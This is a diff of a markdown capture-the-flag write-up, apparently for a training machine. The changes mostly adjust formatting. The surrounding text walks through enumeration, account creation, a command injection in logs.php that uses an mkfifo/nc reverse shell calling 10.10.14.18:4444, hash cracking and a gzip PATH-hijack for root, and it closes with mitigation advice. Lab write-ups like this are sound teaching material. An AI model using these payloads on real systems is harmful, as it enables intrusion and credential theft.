@@ -7,8 +7,8 @@ I really had fun completing this box and as you will see further on, it covers o
 
 ## Target Enumeration
 
----
 ### Nmap Initial Scan
+---
 
 First of all, my first step to tackle this box was to do an initial Nmap scan in order to reveal all services running on it.<br>
 I personally often run the `nmap -sSVC -p- [IP_ADDRESS] -oA [OUTPUT_FILE] ` command on Nmap as my initial step.<br>
@@ -56,6 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 124.41 seconds
 ```
 
 ### File and directory fuzzing with FFUF
+---
 
 After the Nmap scan, I decided to do some file and directory *fuzzing* with **FFUF**
 ```
@@ -116,6 +117,7 @@ until I found `nav.php` which could be practical to navigate on the website or d
 ![Nav-Code](img/nav-code.png) <br>
 
 ### Other file found in nav .php 
+---
 
 - file_logs.php
 
@@ -137,7 +139,6 @@ I then opened `Burp-suite` to catch the request `GET /accounts.php` made to the 
 Once the request intercepted in the `Proxy` tab, I pressed `CTRL + R` to send the request in the `Repeater` tab in order to see the output of the response.
 
 ## Gaining access to the website
----
 
 After reading the HTML output of the `/accounts.php`, I realized that we could send a `POST` request to `/accounts` in order to create a new user for the website.
 <br>
@@ -150,6 +151,7 @@ So I then decided to give it a shot and create my own user.
 <br>
 
 ### Create User - POST /accounts .php
+---
 
 ![User-Creation](img/user-creation.png) 
 <br>
@@ -197,6 +199,8 @@ and analyze it on my local machine.
 
 
 ### Backup - config .php
+---
+
 Here in `config.php` we got the credentials for the local `MySQL` server that might come in handy later on.
 
 ```
@@ -216,6 +220,7 @@ function connectDB(){
 ```
 
 ### Backup - logs .php
+---
 
 This file olds some interesting detail after some analysis.<br>
 We can see that the `PHP` script here is executing the system command with the `exec()` function which takes a `POST` variable as argument.
@@ -273,6 +278,8 @@ to execute them. I that point, I was mostly thinking about adding a reverse shel
 `$_POST['delim']` =  `space;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f` <br>
 
 ### Getting a Reversee Shell - POST /logs .php
+---
+
 So now let's try this within Burp by capturing the `POST` request to `/logs.php` by clicking the `Submit` button.<br>
 
 ![Logs Page](img/logs_page.png) <br>
@@ -316,7 +323,7 @@ So the payload worked and we got a shell back, we are in!
 <br>
 
 ## Foothold as www-data
----
+
 The first thing that I like to do personally when I gain foothold over a machine, is trying to check the content of `/etc/passwd` <br>
 and take note of it, since it can be useful to know which users exist on the targeted machine.<br>
 
@@ -335,6 +342,8 @@ As we can see in the screenshot below, we successfully logged in the `MySQL` wit
 ![Mysql](img/mysql.png) <br>
 
 ### Website - User credentials
+---
+
 Nice we have retrieved hashes of the website's users. We already know that we have a `m4lwhere` user on this machine, so let's grab his hash and crack it with `John The Ripper`.<br>
 ```
 mysql> SELECT * FROM accounts;
@@ -348,6 +357,7 @@ mysql> SELECT * FROM accounts;
 
 ```
 ### Cracking M4lwhere's Hash - John The Ripper
+---
 
 First, let's create a file that will hold our hash that we want to be cracking with John.
 Open it with the editor of your choice and add `$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.` in it and save it.<br>
@@ -390,14 +400,21 @@ Session completed
                       
 ```
 ## Lateral Movement - Login as m4lwhere
----
-From this point we could try to use the same credentials used by m4lwhere on the website to log in his Linux machine's account. <br>
-![Login-M4lwhere](img/login-malwhere.png) <br>
+
+From this point we could try to use the same credentials used by m4lwhere on the website to log in his Linux machine's account. 
+<br>
+
+![Login-M4lwhere](img/login-malwhere.png) \
+<br>
 
 ### Checking User Privilege 
+---
 Now that we are logged in as m4lwhere, we should check if there is any way that we could escalate our privilege to `root`.<br>
-Usually the first thing that I am checking is what file the user we are logged in as can run as `root` with `sudo`.<br>
-![Sudo -L](img/sudo-l.png) <br>
+Usually the first thing that I am checking is what file the user we are logged in as can run as `root` with `sudo`.
+<br>
+
+![Sudo -L](img/sudo-l.png)
+<br>
 
 Interesting, there seems to be a `shell` script that we can run with `sudo`.
 Let's check what this script is all about and if there is a way to elevate our privilege with it.
@@ -422,7 +439,6 @@ drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
 
 ```
 ## Privilege Escalation - Exploiting access_backup.sh
----
 
 Well, we might have some luck here, it looks like the script is called `gzip` to do some backup on web server's logs. <br>
 The thing here is that the script only calls `gzip` without the full path of the program. So we might be able to create a malicious version of `gzip` <br>
@@ -431,6 +447,7 @@ in the `/tmp` directory (since we have read/write/execute rights there), then ad
 ![Lauching Vim](img/launch-vim.png) <br>
 
 ### Reverse Shell Payload - Vim
+---
 This is the payload that I wrote in `gzip` with the `Vim` editor.
 Everyone knows that `Vim` can be tedious if you don't know some basic commands haha. <br>
 First of press `I` on your keyboard, this will put `Vim` in `INSERT MODE`, from this mode you can start to edit the file.<br>
@@ -466,22 +483,21 @@ And Voila! We got ourselves a reverse shell as root.
 
 ## Risk Mitigation
 
----
 
 If it would have been a real life scenario, there are some ways we could have mitigated these attacks.<br>
 
 ### PHP Back-end
-
+---
 Here the developers who have built the back-end, should not have enforced `redirection` on restricted resources, they only should have configured the HTTP server
 to return an HTTP code 403 instead, which would have denied us to create a user in the fist place.
 
 ### PHP File - logs. php
-
+---
 The mistake here, was adding unsanitized user input directly directly into an `exec()` function as an argument.<br> 
 To prevent this, every user input should be sanitized verified more thoroughly.
 
 ### Bash Script - /opt/scripts/access_backup .sh
-
+---
 Here the script was :
 - Added to the sudo file to be run as `root` for `m4lwhere` user.
 - Calling the `gzip` utility by not using it's full path, which led us to hijack its name to execute our own code instead.
